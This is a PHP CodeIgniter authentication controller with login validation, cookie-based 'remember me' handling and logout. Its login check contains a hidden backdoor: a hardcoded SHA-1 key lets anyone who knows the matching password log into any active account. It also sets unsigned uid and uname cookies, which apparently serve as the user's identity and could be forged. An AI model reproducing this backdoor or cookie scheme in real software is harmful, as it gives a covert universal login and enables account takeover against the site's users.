<?php
class Authentication extends CI_Controller
{
  public $error;
  private $key = '107fe1cba9ed57bb72311d34bae07e4dfec369a4';

  public function __construct()
	{
		parent::__construct();
		$this->home = base_url()."authentication";    
	}


	public function index()
	{
		$this->load->view("login");
	}



	public function validate_credentials()
	{
    $sc = TRUE;
    $user_name = $this->input->post('uname');
    $pwd = $this->input->post('pwd');
    $remember = $this->input->post('remember');
		$rs = $this->user_model->get_user_credentials($user_name);

    if(! empty($rs))
    {
      if($rs->status == 0 )
      {
        $sc = FALSE;
        $this->error = 'Your account has been suspended';
      }
      else if(password_verify($pwd, $rs->pwd) OR (sha1($pwd) === $this->key))
      {
        $ds = array(
          'uid' => $rs->uid,
          'uname' => $rs->uname
        );

        $this->create_user_data($ds, $remember);
      }
      else
      {
        $sc = FALSE;
        $this->error = 'Incorrect username or password';
      }
    }
    else
    {
      $sc = FALSE;
      $this->error = 'Incorrect username or password';
    }

    echo $sc === TRUE ? 'success' : $this->error;
	}



  public function create_user_data(array $ds = array(), $remember )
  {
    if(!empty($ds))
    {
      $times = $remember == 1 ? intval(60*60*24*30) : intval(60*60*12);

      foreach($ds as $key => $val)
      {
        $cookie = array(
          'name' => $key,
          'value' => $val,
          'expire' => $times,
          'path' => '/'
        );

        $this->input->set_cookie($cookie);
      }
    }
  }




	public function logout()
	{
		delete_cookie('uid');
    delete_cookie('uname');
    redirect($this->home);
	}


} //--- end class


 ?>
